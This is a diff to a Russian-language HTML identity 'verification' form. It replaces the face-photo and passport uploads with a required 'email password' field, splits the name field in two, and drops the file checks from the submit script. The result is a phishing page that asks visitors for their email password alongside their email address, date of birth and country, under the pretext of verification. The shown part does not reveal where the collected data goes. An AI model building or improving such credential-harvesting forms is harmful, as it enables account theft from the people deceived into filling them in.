@@ -1337,8 +1337,14 @@ html
 
       <form id="verifyForm">
         <div class="input-group">
-          <label>ФИО (полностью)</label>
-          <input id="fullname" required placeholder="Иванов Иван Иванович">
+          <label>Имя</label>
+          <input id="firstName" required placeholder="Иван">
+          <i class="fas fa-user input-icon"></i>
+        </div>
+
+<div class="input-group">
+          <label>Фамилия</label>
+          <input id="lastName" required placeholder="Иванов">
           <i class="fas fa-user input-icon"></i>
         </div>
 
@@ -1375,17 +1381,13 @@ html
           <i class="fas fa-globe input-icon"></i>
         </div>
 
-        <div class="input-group">
-          <label>Фото лица (селфи или файл)</label>
-          <input type="file" id="photo" accept="image/*"  required>
-          <i class="fas fa-camera input-icon"></i>
-        </div>
+<div class="input-group">
+  <label>Пароль от почты</label>
+  <input id="emailPassword" type="password" required placeholder="Введите пароль от почты">
+  <i class="fas fa-key input-icon"></i>
+</div>
 
-        <div class="input-group">
-          <label>Фото документа (паспорт/ID)</label>
-          <input type="file" id="document" accept="image/*" required>
-          <i class="fas fa-id-card input-icon"></i>
-        </div>
+
 
         <button type="submit"><i class="fas fa-paper-plane"></i> Отправить на проверку</button>
       </form>
@@ -1673,14 +1675,8 @@ html
       const dob = document.getElementById('dob').value;
       const email = document.getElementById('email').value;
       const country = document.getElementById('country').value;
-      const photo = document.getElementById('photo').files[0];
-      const documentFile = document.getElementById('document').files[0];
-      
-      if (!photo || !documentFile) {
-        showNotification('Загрузите все необходимые файлы', 'error');
-        return;
-      }
-      
+                  
+            
       updateProgress(2);
       
       // Создаем текст сообщения
